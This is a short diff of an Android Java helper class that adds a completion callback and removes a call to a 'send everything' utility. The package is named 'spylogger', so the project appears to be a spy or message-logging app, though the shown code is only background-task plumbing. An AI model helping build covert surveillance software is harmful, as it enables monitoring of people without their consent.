@@ -4,7 +4,6 @@ import android.content.Context;
 import android.os.AsyncTask;
 
 import com.gravatasufoca.spylogger.services.Mensageiro;
-import com.gravatasufoca.spylogger.utils.Utils;
 
 /**
  * Created by bruno on 21/04/17.
@@ -13,9 +12,11 @@ import com.gravatasufoca.spylogger.utils.Utils;
 public class MensageiroAsyncHelper extends AsyncTask<Mensageiro,Integer,Boolean> {
 
     private Context context;
+    private TaskComplete taskComplete;
 
-    public MensageiroAsyncHelper(Context context) {
+    public MensageiroAsyncHelper(Context context, TaskComplete taskComplete) {
         this.context = context;
+        this.taskComplete = taskComplete;
     }
 
     @Override
@@ -25,10 +26,15 @@ public class MensageiroAsyncHelper extends AsyncTask<Mensageiro,Integer,Boolean>
             for (Mensageiro mensageiro:mensageiros) {
                 mensageiro.start();
             }
-            Utils.enviarTudo(context);
             return true;
         }
         return false;
     }
 
+    @Override
+    protected void onPostExecute(Boolean aBoolean) {
+        if (aBoolean && taskComplete != null) {
+            taskComplete.onFinish(null);
+        }
+    }
 }
